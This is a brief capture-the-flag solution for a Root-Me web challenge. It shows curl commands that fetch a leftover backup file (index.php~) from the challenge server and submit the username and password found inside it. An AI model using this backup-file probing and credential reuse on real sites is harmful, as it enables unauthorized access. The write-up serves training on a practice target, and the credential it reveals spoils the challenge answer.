#Solution
Test for typical backup files

```sh
curl http://challenge01.root-me.org/web-serveur/ch11/index.php~
```

Find username and password in backup file

```sh
curl -d "username=ch11&password=OCCY9AcNm1tj" -X POST http://challenge01.root-me.org/web-serveur/ch11/index.php~
```

